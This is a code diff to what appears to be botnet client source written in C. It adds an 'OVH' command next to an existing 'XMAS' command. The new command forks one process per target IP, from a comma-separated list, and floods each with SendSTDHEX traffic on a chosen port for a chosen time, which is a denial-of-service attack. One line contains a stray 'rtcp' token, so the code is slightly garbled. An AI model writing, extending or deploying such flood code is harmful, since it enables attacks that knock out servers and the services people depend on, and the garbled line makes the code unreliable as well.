@@ -887,6 +887,34 @@ void processCmd(int argc, unsigned char *argv[]) {
 						}
         }
 
+                if(!strcmp(argv[0], "OVH"))
+        {
+        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
+        {
+            return;
+        }
+        unsigned char *ip = argv[1];
+        int port = atoi(argv[2]);
+        int time = atoi(argv[3]);
+        if(strstr(ip, ",") != NULL)
+        {
+            unsigned char *hi = strtok(ip, ",");
+            while(hi != NULL)
+            {
+                if(!listFork())
+                {
+                    SendSTDHEX(hi, port, time);
+                    _exit(0);
+                }
+                hi = strtok(NULL, ",");
+            }
+        } else {
+            if (listFork()) { return; }rtcp
+            SendSTDHEX(ip, port, time);
+            _exit(0);
+        }
+    }
+
                 if(!strcmp(argv[0], "XMAS")){
             if(argc < 4 || atoi(argv[3]) > 10000){
                 return;
